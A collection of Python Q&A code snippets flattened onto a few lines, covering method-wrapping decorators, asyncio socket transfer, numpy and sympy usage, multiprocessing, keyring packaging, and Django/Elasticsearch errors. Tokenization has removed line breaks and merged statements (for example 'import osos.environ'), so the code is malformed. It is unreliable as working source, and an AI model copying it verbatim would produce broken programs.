chaining up . So that 's a severe limitation of this implementation . ' '' def newfunc ( ) : gocontinue = True supercontinue = True if around_func : gocontinue = around_func ( ) if gocontinue and super_around_func : supercontinue = super_around_func ( ) if gocontinue and supercontinue : if before_func : before_func ( ) if super_before_func : super_before_func ( ) result = func ( self ) if super_after_func : super_after_func ( ) if after_func : after_func ( ) else : result = None if gocontinue : if super_around_func : super_around_func ( direction= '' out '' ) if around_func : around_func ( direction='out ' ) return result return newfunc ( ) return wrapper # Really , the way to do this is to have the decorator end up decorating # all the methods , the primary and the before and afters . Now THAT would be a decorator ! class weeclass ( object ) : @ closwrapper def helloworld ( self ) : print `` Hello Wee World '' def helloworld_before ( self ) : print `` Am I really so wee Before ? This method is not called on subclass but should be '' class baseclass ( weeclass ) : fooey = 1 def __init__ ( self ) : self.calls = 0 @ closwrapper def helloworld ( self ) : print `` Hello World '' def helloworld_before ( self ) : self.fooey += 2 print `` Baseclass Before '' def helloworld_after ( self ) : self.fooey += 2 print `` Baseclass After Fooey Now '' , self.fooey def helloworld_around ( self , direction='in ' ) : if direction=='in ' : print `` Aound Start '' if self.fooey < 10 : return True else : print `` > > FOOEY IS TOO BIG ! ! ! '' self.fooey = -10 return False # call-next-method if not direction=='in ' : # self.barrey -= 4 # hello ? ? This should not work ! ! ! It should croak ? print `` Around End '' class subclass ( baseclass ) : barrey = 2 @ closwrapper def helloworld ( self ) : print `` Hello Sub World Fooey '' , self.fooey , '' barrey '' , self.barrey def helloworld_before ( self ) : self.fooey -= 1 self.barrey += 5 print `` Sub Before '' def helloworld_after ( self ) : print `` Sub After '' def helloworld_around ( self , direction='in ' ) : if direction=='in ' : print `` Sub Around Start '' if self.barrey > 4 : print `` > > Hey Barrey too big ! '' self.barrey -= 8 return False else : return True # call-next-method if not direction=='in ' : self.barrey -= 4 print `` Sub Around End '' Python 2.6.4 ( r264:75706 , Mar 1 2010 , 12:29:19 ) [ GCC 4.2.1 ( Apple Inc. build 5646 ) ( dot 1 ) ] on darwin Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information . > > > import cw > > > s= cw.subclass ( ) > > > s.helloworld ( ) Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey 2 barrey 7 Baseclass After Fooey Now 4 Sub After Around End Sub Around End > > > s.helloworld ( ) Sub Around StartAound Start Sub Before Baseclass Before Hello Sub World Fooey 5 barrey 8 Baseclass After Fooey Now 7 Sub After Around End Sub Around End > > > s.helloworld ( ) Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey 8 barrey 9 Baseclass After Fooey Now 10 Sub After Around End Sub Around End > > > s.helloworld ( ) Sub Around Start > > Hey Barrey too big ! Sub Around End > > > s.helloworld ( ) Sub Around Start Aound Start > > FOOEY IS TOO BIG ! ! ! Around End Sub Around End > > > s.helloworld ( ) Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -9 barrey -6 Baseclass After Fooey Now -7 Sub After Around End Sub Around End > > > s.helloworld ( ) Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -6 barrey -5 Baseclass After Fooey Now -4 Sub After Around End Sub Around End > > > s.helloworld ( ) Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -3 barrey -4 Baseclass After Fooey Now -1 Sub After Around End Sub Around End > > > b = cw.baseclass ( ) > > > b.helloworld ( ) Aound Start Baseclass Before Am I really so wee Before ? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 5 Around End > > > b.helloworld ( ) Aound Start Baseclass Before Am I really so wee Before ? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 9 Around End > > > b.helloworld ( ) Aound Start Baseclass Before Am I really so wee Before ? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 13 Around End > > > b.helloworld ( ) Aound Start > > FOOEY IS TOO BIG ! ! ! Around End > > > b.helloworld ( ) Aound Start Baseclass Before Am I really so wee Before ? This method is not called on subclass but should be Hello World Baseclass After Fooey Now -6 Around End"
python3 test_suite.py -v
"import osos.environ [ 'PYTHONASYNCIODEBUG ' ] = ' 1'import asyncioimport logginglogging.basicConfig ( level=logging.ERROR ) async def tcp_echo_client ( data , loop ) : reader , writer = await asyncio.open_connection ( < ip_addr > , < port > , loop=loop ) print ( 'Sending data of size : % r ' % str ( len ( data ) ) ) writer.write ( data ) await writer.drain ( ) # print ( `` Message : % r '' % ( data ) ) print ( type ( data ) ) print ( 'Close the socket ' ) writer.write_eof ( ) writer.close ( ) with open ( 'sendpic0.jpg ' , 'rb ' ) as f : data=f.read ( ) loop = asyncio.get_event_loop ( ) loop.run_until_complete ( tcp_echo_client ( data , loop ) ) loop.close ( ) import osos.environ [ 'PYTHONASYNCIODEBUG ' ] = ' 1'import asyncioimport logginglogging.basicConfig ( level=logging.ERROR ) async def handle_echo ( reader , writer ) : data = await reader.read ( ) addr = writer.get_extra_info ( 'peername ' ) # print ( `` Received % r from % r '' % ( message , addr ) ) print ( `` Length of data recieved : % r '' % ( str ( len ( data ) ) ) ) # with open ( 'recvpic0.jpg ' , 'wb ' ) as f : # f.write ( data ) print ( `` Close the client socket '' ) writer.close ( ) # print ( `` Message : % r '' % ( data ) ) print ( `` Received data of length : % r '' % ( str ( len ( data ) ) ) ) loop = asyncio.get_event_loop ( ) data=b '' coro = asyncio.start_server ( handle_echo , `` , < port_number > , loop=loop ) server = loop.run_until_complete ( coro ) print ( `` Received data of length : % r '' % ( str ( len ( data ) ) ) ) # Serve requests until Ctrl+C is pressedprint ( 'Serving on { } '.format ( server.sockets [ 0 ] .getsockname ( ) ) ) try : loop.run_forever ( ) except KeyboardInterrupt : pass # Close the serverserver.close ( ) loop.run_until_complete ( server.wait_closed ( ) ) loop.close ( ) Received data of length : ' 0'Serving on ( ' 0.0.0.0 ' , 50001 ) Length of data recieved : '249216'Close the client socketReceived data of length : '249216 ' Length of data recieved : '250624 ' Close the client socket Received data of length : '250624'Length of data recieved : '256403 ' Close the client socket Received data of length : '256403 ' $ python client.py Sending data of size : '256403 ' Close the socket $ python client.py < class 'bytes ' > Close the socket $ python client.py Sending data of size : '256403 ' < class 'bytes ' > Close the socket"
"nu = Symbol ( 'nu ' ) lamb = Symbol ( 'lambda ' ) A3 = Matrix ( [ [ -3*nu , 1 , 0 , 0 ] , [ 3*nu , -2*nu-1 , 2 , 0 ] , [ 0 , 2*nu , ( -1 * nu ) - lamb - 2 , 3 ] , [ 0 , 0 , nu + lamb , -3 ] ] ) print A3.rref ( ) ( Matrix ( [ [ 1 , 0 , 0 , 0 ] , [ 0 , 1 , 0 , 0 ] , [ 0 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 1 ] ] ) , [ 0 , 1 , 2 , 3 ] ) raise ValueError ( `` Matrix det == 0 ; not invertible . '' ) ( Matrix ( [ [ 1 , 0 , 0 , -1/nu**3 ] , [ 0 , 1 , 0 , -3/nu**2 ] , [ 0 , 0 , 1 , -3/nu ] , [ 0 , 0 , 0 , 0 ] ] ) , [ 0 , 1 , 2 ] )"
"class BinaryCont ( object ) : def __init__ ( self ) : self.root = None self.size = 0 def __iter__ ( self ) : class EmptyIter ( ) : def next ( self ) : raise StopIteration if self.root : return self.root.__iter__ ( ) return EmptyIter ( ) class Node ( object ) : def __init__ ( self , val , left=None , right=None ) : self.val = val self.left = left self.right = right def __iter__ ( self ) : if self.has_left_child ( ) : for child in self.left : yield child yield self.val if self.has_right_child ( ) : for child in self.right : yield child bt = BinaryCont ( ) bt.insert ( 5 ) bt.insert ( 3 ) bt.insert ( 7 ) for node in bt : print node357it = iter ( bt ) type ( it ) < type 'generator ' >"
"import multiprocessingfrom multiprocessing import Managerdef MultiProcDecorator ( f , *args ) : `` '' '' Takes a function f , and formats it so that results are saved to a shared dict `` '' '' def g ( procnum , return_dict , *args ) : result = f ( *args ) return_dict [ procnum ] = result return gdef MultiProcFunction ( f , n_procs , *args ) : `` '' '' Takes a function f , and runs it in n_procs with given args `` '' '' manager = Manager ( ) return_dict = manager.dict ( ) jobs = [ ] for i in range ( n_procs ) : p = multiprocessing.Process ( target = f , args = ( i , return_dict ) + args ) jobs.append ( p ) p.start ( ) for proc in jobs : proc.join ( ) return dict ( return_dict ) from MultiProcFunctions import *def sq ( x ) : return [ i**2 for i in x ] g = MultiProcDecorator ( sq ) if __name__ == '__main__ ' : result = MultiProcFunction ( g,2 , [ 1,2,3 ] ) def g ( procnum , return_dict , x ) : result = [ i**2 for i in x ] return_dict [ procnum ] = result"
$ PYTHONINSPECT=1 python -c 'import os ; print os.environ [ `` PYTHONINSPECT '' ] ' $ python -i -c 'import os ; print os.environ [ `` PYTHONINSPECT '' ] '
"> > > aarray ( [ -1.7 , -1.5 , -0.2 , 0.2 , 1.5 , 1.7 , 2 . ] ) > > > np.round ( a ) array ( [ -2. , -2. , -0. , 0. , 2. , 2. , 2 . ] ) > > > np.rint ( a ) array ( [ -2. , -2. , -0. , 0. , 2. , 2. , 2 . ] )"
"class MyList ( list ) : def __init__ ( self , sequence ) : super ( ) .__init__ ( sequence ) self._test ( ) def __setitem__ ( self , key , value ) : super ( ) .__setitem__ ( key , value ) self._test ( ) def append ( self , value ) : super ( ) .append ( value ) self._test ( ) def _test ( self ) : `` '' '' Some kind of check on the data. `` '' '' if not self == sorted ( self ) : raise ValueError ( `` List not sorted . '' )"
"> > > ls = [ 'foo ' , 'bar ' , 'foobar ' , 'barbar ' ] > > > > > > for i in sorted ( ls ) : ... print i ... barbarbarfoofoobar > > > > > > for i in sorted ( ls , key=len ) : ... print i ... foobarfoobarbarbar > > > > > > for i in sorted ( ls , key=str ) : ... print i ... barbarbarfoofoobar barfoobarbarfoobar"
"arr = [ [ 1 , 2 ] , [ 3 , 4 ] ] # arr_new = [ arr^0 , arr^1 , arr^2 , arr^3 , ... arr^order ] arr_new = [ [ 1 , 1 , 1 , 2 , 1 , 4 , 1 , 8 ] , [ 1 , 1 , 3 , 4 , 9 , 16 , 27 , 64 ] ] # Pre-allocate an array for powersarr = np.array ( [ [ 1 , 2 ] , [ 3,4 ] ] ) order = 3rows , cols = arr.shapearr_new = np.zeros ( ( rows , ( order+1 ) * cols ) ) # Iterate over each exponentfor i in range ( order + 1 ) : arr_new [ : , ( i * cols ) : ( i + 1 ) * cols ] = arr**iprint ( arr_new ) arr = np.array ( [ [ 1 , 2 ] , [ 3,4 ] ] ) order = 3arrLarge = np.random.randint ( 0 , 10 , ( 100 , 100 ) ) # 100 x 100 arrayorderLarge = 10 def loop_based ( arr , order ) : # pre-allocate an array for powers rows , cols = arr.shape arr_new = np.zeros ( ( rows , ( order+1 ) * cols ) ) # iterate over each exponent for i in range ( order + 1 ) : arr_new [ : , ( i * cols ) : ( i + 1 ) * cols ] = arr**i return arr_new def broadcast_based_hstack ( arr , order ) : # Create a 3D exponent array for a 2D input array to force broadcasting powers = np.arange ( order + 1 ) [ : , None , None ] # Generate values ( third axis contains array at various powers ) exponentiated = arr ** powers # Reshape and return array return np.hstack ( exponentiated ) # < == using hstack function def broadcast_based_reshape ( arr , order ) : # Create a 3D exponent array for a 2D input array to force broadcasting powers = np.arange ( order + 1 ) [ : , None ] # Generate values ( 3-rd axis contains array at various powers ) exponentiated = arr [ : , None ] ** powers # reshape and return array return exponentiated.reshape ( arr.shape [ 0 ] , -1 ) # < == using reshape function def broadcast_cumprod_reshape ( arr , order ) : rows , cols = arr.shape # Create 3D empty array where the middle dimension is # the array at powers 0 through order out = np.empty ( ( rows , order + 1 , cols ) , dtype=arr.dtype ) out [ : , 0 , : ] = 1 # 0th power is always 1 a = np.broadcast_to ( arr [ : , None ] , ( rows , order , cols ) ) # Cumulatively multiply arrays so each multiplication produces the next order np.cumprod ( a , axis=1 , out=out [ : ,1 : , : ] ) return out.reshape ( rows , -1 ) % timeit -n 100000 loop_based ( arr , order ) 7.41 µs ± 174 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) % timeit -n 100000 broadcast_based_hstack ( arr , order ) 10.1 µs ± 137 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) % timeit -n 100000 broadcast_based_reshape ( arr , order ) 3.31 µs ± 61.5 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) % timeit -n 100000 broadcast_cumprod_reshape ( arr , order ) 11 µs ± 102 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) % timeit -n 1000 loop_based ( arrLarge , orderLarge ) 261 µs ± 5.82 µs per loop ( mean ± std . dev . of 7 runs , 1000 loops each ) % timeit -n 1000 broadcast_based_hstack ( arrLarge , orderLarge ) 225 µs ± 4.15 µs per loop ( mean ± std . dev . of 7 runs , 1000 loops each ) % timeit -n 1000 broadcast_based_reshape ( arrLarge , orderLarge ) 223 µs ± 2.16 µs per loop ( mean ± std . dev . of 7 runs , 1000 loops each ) % timeit -n 1000 broadcast_cumprod_reshape ( arrLarge , orderLarge ) 157 µs ± 1.02 µs per loop ( mean ± std . dev . of 7 runs , 1000 loops each )"
"from sympy import symbols , acos , MatrixSymbol , MatrixrA = MatrixSymbol ( `` r^A '' , 2 , 1 ) rB = MatrixSymbol ( `` r^B '' , 2 , 1 ) rA , rB = Matrix ( rA ) , Matrix ( rB ) # Basically I want to skip this stepacos ( ( rA.dot ( rB ) ) / rA.norm ( ) ) ⎛r_00__A⋅r_00__B + r_10__A⋅r_10__B ⎞ acos⎜─────────────────────────────────⎟ ⎜ _________________________ ⎟ ⎜ ╱ 2 2 ⎟ ⎝ ╲╱ │r_00__A│ + │r_10__A│ ⎠ ⎛ r_A⋅r_B ⎞acos⎜─────────⎟ ⎝ ||r_A|| ⎠"
"[ [ 1 , [ ... ] ] , [ 1 , [ ... ] ] , [ 2 , [ ... ] ] ] from random import randintdef print_board ( board ) : for row in board : print `` `` .join ( row ) def random_row ( board ) : return randint ( 0 , len ( board ) - 1 ) def random_col ( board ) : return randint ( 0 , len ( board [ 0 ] ) - 1 ) def set_the_ships ( num_ships , board ) : ship_list = [ ] for i in range ( num_ships ) : ship_row = random_row ( board ) ship_col = random_col ( board ) position = [ ship_row , ship_list ] for j in range ( i - 1 ) : while ( position [ 0 ] == ship_list [ j ] [ 0 ] and position [ 1 ] == ship_list [ j ] [ 1 ] ) : ship_row = random_row ( board ) ship_col = random_col ( board ) position = [ ship_row , ship_list ] ship_list.append ( position ) return ship_listprint set_the_ships ( 3 , [ [ 0,0,0 ] , [ 0,0,0 ] , [ 0,0,0 ] ] )"
OBJECT = TABLE ROWS = 128 ROW_BYTES = 512 END_OBJECT = TABLE
"import weakrefclass WeakBoundMethod : `` '' '' Wrapper around a method bound to a class instance . As opposed to bare bound methods , it holds only a weak reference to the ` self ` object , allowing it to be deleted . This can be useful when implementing certain kinds of systems that manage callback functions , such as an event manager. `` '' '' def __init__ ( self , meth ) : `` '' '' Initializes the class instance . It should be ensured that methods passed through the ` meth ` parameter are always bound methods . Static methods and free functions will produce an ` AssertionError ` . `` '' '' assert ( hasattr ( meth , '__func__ ' ) and hasattr ( meth , '__self__ ' ) ) , \ 'Object is not a bound method . ' self._self = weakref.ref ( meth.__self__ ) self._func = meth.__func__ def __call__ ( self , *args , **kw ) : `` '' '' Calls the bound method and returns whatever object the method returns . Any arguments passed to this will also be forwarded to the method . In case an exception is raised by the bound method , it will be caught and thrown again to the caller of this ` WeakBoundMethod ` object . Calling this on objects that have been collected will result in an ` AssertionError ` being raised. `` '' '' assert self.alive ( ) , 'Bound method called on deleted object . ' try : return self._func ( self._self ( ) , *args , **kw ) except Exception as e : raise e def alive ( self ) : `` '' '' Checks whether the ` self ` object the method is bound to has been collected. `` '' '' return self._self ( ) is not None class TestWeakBoundMEthod ( unittest.TestCase ) : def setUp ( self ) : self.bm = Mock ( name='bound method ' ) self.bm.__self__ = Mock ( name='self ' ) self.bm.__func__ = Mock ( name='func ' ) def test_call ( self ) : wbm = events.WeakBoundMethod ( self.bm ) wbm ( ) self.bm.__func__.assert_called_with ( self.bm.__self__ ) wbm ( 1 , 2 , 3 ) self.bm.__func__.assert_called_with ( self.bm.__self__ , 1 , 2 , 3 )"
data = requests.get ( 'http : //www.dota2.com/jsfeed/heropediadata ? feeds=abilitydata & l=english ' ) .json ( ) for key in data [ 'abilitydata ' ] : print key tiny_avalancherubick_fade_boltdoom_bringer_devourundying_flesh_golem ...
"< form action= '' < % = endpoint % > '' method= '' post '' data-remote= '' true '' id= '' form '' > FORM FIELDS HERE < /form > $ ( 'body ' ) .on ( 'ajax : success ' , ' # form ' , function ( event , data ) { DO SOME STUFF HERE } ) ; def some_ajax_action if request.xhr ? THIS IS AN AJAX REQUEST RENDER A VIEW PARTIAL & MANIPULATE THE DOM WITH JS OR RESPOND WITH JSON else THIS ISNT AN AJAX REQUEST endend < form action= '' { % url 'app : view ' % } '' method= '' post '' id= '' form '' > FORM FIELDS HERE OR { { BUILD_FORM_FROM_CONTEXT } } < /form > $ ( `` # form '' ) .on ( `` submit '' , function ( event ) { $ .ajax ( { type : `` POST '' , beforeSend : function ( request ) { request.setRequestHeader ( `` X-CSRFToken '' , csrftoken ) ; } , data : data , url : `` endpoint '' , dataType : 'json ' , contentType : 'application/json ' , } ) .done ( function ( data ) { cb ( null , data ) } ) .fail ( function ( data ) { cb ( data ) } ) .always ( function ( data ) { cb ( data ) } ) } ) ; } ) ;"
"> > > class Test ( object ) : pass ... > > > t = Test ( ) > > > > > > t.__hash__ < method-wrapper '__hash__ ' of Test object at 0x01F2B5D0 > > > > > > > t.__cmp__Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'Test ' object has no attribute '__cmp__ ' > > >"
my_project/├── script.py my_project/├── script.py├── util/│ └── string_util.py├── services/│ └── my_service.py
"$ heroku run python Running python attached to terminal ... up , run.2Python 2.7.1 ( r271:86832 , Jun 26 2011 , 01:08:11 ) [ GCC 4.4.3 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import sqlite3Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/local/lib/python2.7/sqlite3/__init__.py '' , line 24 , in < module > from dbapi2 import * File `` /usr/local/lib/python2.7/sqlite3/dbapi2.py '' , line 27 , in < module > from _sqlite3 import *ImportError : No module named _sqlite3 > > >"
"x , y , z , w1x , y , z , w2x , y , z , w3 x , y , z , w1 [ [ 0.7732126 0.48649481 0.29771819 0.91622924 ] [ 0.7732126 0.48649481 0.29771819 1.91622924 ] [ 0.58294263 0.32025559 0.6925856 0.0524125 ] [ 0.58294263 0.32025559 0.6925856 0.05 ] [ 0.58294263 0.32025559 0.6925856 1.7 ] [ 0.3239913 0.7786444 0.41692853 0.10467392 ] [ 0.12080023 0.74853649 0.15356663 0.4505753 ] [ 0.13536096 0.60319054 0.82018125 0.10445047 ] [ 0.1877724 0.96060999 0.39697999 0.59078612 ] ] [ [ 0.7732126 0.48649481 0.29771819 1.91622924 ] [ 0.58294263 0.32025559 0.6925856 1.7 ] [ 0.3239913 0.7786444 0.41692853 0.10467392 ] [ 0.12080023 0.74853649 0.15356663 0.4505753 ] [ 0.13536096 0.60319054 0.82018125 0.10445047 ] [ 0.1877724 0.96060999 0.39697999 0.59078612 ] ]"
Column1 Column2 Column3 Column4 Pat 123 John 456 Pat 123 John 345 Jimmy 678 Mary 678 Larry 678 James 983 Column1 Column2 Column3 Column4 Pat 123 John 456 Pat 123 John 345 Larry 678 James 983
"def testRust ( ) : lib = ctypes.cdll.LoadLibrary ( rustLib ) list_to_send = [ 'blah ' , 'blah ' , 'blah ' , 'blah ' ] c_array = ( ctypes.c_char_p * len ( list_to_send ) ) ( ) lib.get_strings ( c_array , len ( list_to_send ) ) # ! [ feature ( libc ) ] extern crate libc ; use std : :slice ; use libc : : { size_t , STRING_RECEIVER } ; # [ no_mangle ] pub extern fn get_strings ( array : *const STRING_RECEIVER , length : size_t ) { let values = unsafe { slice : :from_raw_parts ( array , length as usize ) } ; println ! ( `` { : ? } '' , values ) ; }"
"import numpy as npfrom multiprocessing import Poolimport pandas as pdimport pdbimport timen = 1000variables = { `` hello '' : np.arange ( n ) , `` there '' : np.random.randn ( n ) } df = pd.DataFrame ( variables ) def apply_fn ( series ) : return pd.Series ( { `` col_5 '' :5 , `` col_88 '' :88 , `` sum_hello_there '' : series [ `` hello '' ] + series [ `` there '' ] } ) def call_apply_fn ( df ) : return df.apply ( apply_fn , axis=1 ) n_processes = 4 # My machine has 4 CPUspool = Pool ( processes=n_processes ) t0 = time.process_time ( ) new_df = df.apply ( apply_fn , axis=1 ) t1 = time.process_time ( ) df_split = np.array_split ( df , n_processes ) pool_results = pool.map ( call_apply_fn , df_split ) new_df2 = pd.concat ( pool_results ) t2 = time.process_time ( ) new_df3 = df.apply ( apply_fn , axis=1 ) # Try df.apply a second timet3 = time.process_time ( ) print ( `` identical results : % s '' % np.all ( np.isclose ( new_df , new_df2 ) ) ) # Trueprint ( `` t1 - t0 = % f '' % ( t1 - t0 ) ) # I got 0.230757print ( `` t2 - t1 = % f '' % ( t2 - t1 ) ) # I got 0.005272print ( `` t3 - t2 = % f '' % ( t3 - t2 ) ) # I got 0.229413"
"import keyringprint ( keyring.get_keyring ( ) ) keyring.set_password ( `` a '' , '' b '' , '' c '' ) print ( keyring.get_password ( `` a '' , '' b '' ) ) < keyring.backends.Windows.WinVaultKeyring object at 0x00000187B7DD6358 > c pyinstaller -- onefile test.py < keyring.backends.Windows.WinVaultKeyring object at 0x00000187B7DD6358 > c < keyring.backends.fail.Keyring object at 0x05463ED0 > Traceback ( most recent call last ) : File `` test.py '' , line 3 , in < module > keyring.set_password ( `` a '' , '' b '' , '' c '' ) File `` site-packages\keyring\core.py '' , line 47 , in set_password File `` site-packages\keyring\backends\fail.py '' , line 23 , in get_passwordRuntimeError : No recommended backend was available . Install the keyrings.alt package if you want to use the non-recommended backends . See README.rst for details . [ 2732 ] Failed to execute script test"
"@ blue_blueprint.route ( '/dashboard ' ) '' '' '' Invoke dashboard view . `` `` '' if 'expires ' in session : if session [ 'expires ' ] > time.time ( ) : pass else : refresh_token ( ) pass total_day = revenues_day ( ) total_month = revenues_month ( ) total_year = revenues_year ( ) total_stock_size = stock_size ( ) total_stock_value = stock_value ( ) mean_cost = total_stock_value/total_stock_size return render_template ( 'dashboard.html.j2 ' , total_day=total_day , < br > total_month=total_month , total_year=total_year , total_stock_size=total_stock_size , total_stock_value=total_stock_value , mean_cost=mean_cost ) else : return redirect ( url_for ( 'blue._authorization ' ) ) def test_dashboard ( client ) : with client.session_transaction ( subdomain='blue ' ) as session : session [ 'expires ' ] = time.time ( ) + 10000 response = client.get ( '/dashboard ' , subdomain='blue ' ) assert response.status_code == 200 @ pytest.fixturedef app ( ) : app = create_app ( 'config_testing.py ' ) yield app @ pytest.fixturedef client ( app ) : return app.test_client ( allow_subdomain_redirects=True ) @ pytest.fixturedef runner ( app ) : return app.test_cli_runner ( allow_subdomain_redirects=True )"
"def generate_batches_from_hdf5_file ( hdf5_file , batch_size , dimensions , num_classes ) : '' '' '' Generator that returns batches of images ( 'xs ' ) and labels ( 'ys ' ) from a h5 file . `` `` '' filesize = len ( hdf5_file [ 'labels ' ] ) while 1 : # count how many entries we have read n_entries = 0 # as long as we have n't read all entries from the file : keep reading while n_entries < ( filesize - batch_size ) : # start the next batch at index 0 # create numpy arrays of input data ( features ) xs = hdf5_file [ 'images ' ] [ n_entries : n_entries + batch_size ] xs = np.reshape ( xs , dimensions ) .astype ( 'float32 ' ) # and label info . Contains more than one label in my case , e.g . is_dog , is_cat , fur_color , ... y_values = hdf5_file [ 'labels ' ] [ n_entries : n_entries + batch_size ] # ys = keras.utils.to_categorical ( y_values , num_classes ) ys = to_categorical ( y_values , num_classes ) # we have read one more batch from this file n_entries += batch_size yield ( xs , ys )"
"import httplib2import osfrom apiclient.discovery import buildfrom oauth2client.client import flow_from_clientsecretsfrom oauth2client.file import Storagefrom oauth2client.tools import runCLIENT_SECRETS = os.path.join ( os.path.dirname ( os.path.abspath ( __file__ ) ) , 'client_secrets.json ' ) MISSING_CLIENT_SECRETS_MESSAGE = ' % s is missing ' % CLIENT_SECRETSFLOW = flow_from_clientsecrets ( ' % s ' % CLIENT_SECRETS , scope='https : //www.googleapis.com/auth/analytics.readonly ' , message=MISSING_CLIENT_SECRETS_MESSAGE , ) TOKEN_FILE_NAME = os.path.join ( os.path.dirname ( os.path.abspath ( __file__ ) ) , 'analytics.dat ' ) def prepare_credentials ( ) : storage = Storage ( TOKEN_FILE_NAME ) credentials = storage.get ( ) if credentials is None or credentials.invalid : credentials = run ( FLOW , storage ) return credentialsdef initialize_service ( ) : http = httplib2.Http ( ) credentials = prepare_credentials ( ) http = credentials.authorize ( http ) return build ( 'analytics ' , 'v3 ' , http=http ) def get_analytics ( ) : initialize_service ( )"
"tf.maximum ( -math.inf , -math.inf ) .eval ( ) tf.reduce_max ( [ -math.inf , -math.inf ] ) .eval ( )"
print ( 0.1 ) print ( 0.2 ) print ( 0.3 ) print ( 0.1 + 0.2 ) > > > 0.1 > > > 0.2 > > > 0.3 > > > 0.30000000000000004 > > > 0.1 > > > 0.2 > > > 0.30000000000000004 > > > 0.30000000000000004
/ROOT/ /PROJECT/ /APPLICATION/ admin.py apps.py models.py tests.py views.py /ROOT/ /PROJECT/ /docs/ /source/ ... conf.py make.bat from django.conf import settingssettings.configure ( ) from django.conf import settingssettings.configure ( ) settings.INSTALLED_APPS += [ 'fintech ' ] import djangodjango.setup ( ) from django.core.management import setup_environfrom django.conf import settingssettings.configure ( ) setup_environ ( settings ) import djangoos.environ [ 'DJANGO_SETTINGS_MODULE ' ] = 'PROJECT.settings'django.setup ( )
"# curl -X GET 127.0.0.1:9200 { `` status '' : 200 , `` name '' : `` White Pilgrim '' , `` cluster_name '' : `` elasticsearch '' , `` version '' : { `` number '' : `` 1.7.4 '' , `` build_hash '' : `` 0d3159b9fc8bc8e367c5c40c09c2a57c0032b32e '' , `` build_timestamp '' : `` 2015-12-15T11:25:18Z '' , `` build_snapshot '' : false , `` lucene_version '' : `` 4.10.4 '' } , `` tagline '' : `` You Know , for Search '' } # python manage.py rebuild_index ERROR : root : Error updating auth using defaultTraceback ( most recent call last ) : File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 188 , in handle_label self.update_backend ( label , using ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 233 , in update_backend do_update ( backend , index , qs , start , end , total , verbosity=self.verbosity , commit=self.commit ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 96 , in do_update backend.update ( index , current_qs , commit=commit ) File `` /usr/local/lib/python2.7/dist-packages/haystack/backends/elasticsearch_backend.py '' , line 193 , in update bulk ( self.conn , prepped_docs , index=self.index_name , doc_type='modelresult ' ) File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 188 , in bulk for ok , item in streaming_bulk ( client , actions , **kwargs ) : File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 160 , in streaming_bulk for result in _process_bulk_chunk ( client , bulk_actions , raise_on_exception , raise_on_error , **kwargs ) : File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 89 , in _process_bulk_chunk raise eConnectionError : ConnectionError ( ( 'Connection aborted . ' , error ( 111 , 'Connection refused ' ) ) ) caused by : ProtocolError ( ( 'Connection aborted . ' , error ( 111 , 'Connection refused ' ) ) ) Traceback ( most recent call last ) : File `` manage.py '' , line 11 , in < module > execute_from_command_line ( sys.argv ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 353 , in execute_from_command_line utility.execute ( ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 345 , in execute self.fetch_command ( subcommand ) .run_from_argv ( self.argv ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/base.py '' , line 348 , in run_from_argv self.execute ( *args , **cmd_options ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/base.py '' , line 399 , in execute output = self.handle ( *args , **options ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/rebuild_index.py '' , line 26 , in handle call_command ( 'update_index ' , **options ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 119 , in call_command return command.execute ( *args , **defaults ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/base.py '' , line 399 , in execute output = self.handle ( *args , **options ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 183 , in handle return super ( Command , self ) .handle ( *items , **options ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/base.py '' , line 548 , in handle label_output = self.handle_label ( label , **options ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 188 , in handle_label self.update_backend ( label , using ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 233 , in update_backend do_update ( backend , index , qs , start , end , total , verbosity=self.verbosity , commit=self.commit ) File `` /usr/local/lib/python2.7/dist-packages/haystack/management/commands/update_index.py '' , line 96 , in do_update backend.update ( index , current_qs , commit=commit ) File `` /usr/local/lib/python2.7/dist-packages/haystack/backends/elasticsearch_backend.py '' , line 193 , in update bulk ( self.conn , prepped_docs , index=self.index_name , doc_type='modelresult ' ) File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 188 , in bulk for ok , item in streaming_bulk ( client , actions , **kwargs ) : File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 160 , in streaming_bulk for result in _process_bulk_chunk ( client , bulk_actions , raise_on_exception , raise_on_error , **kwargs ) : File `` /usr/local/lib/python2.7/dist-packages/elasticsearch/helpers/__init__.py '' , line 89 , in 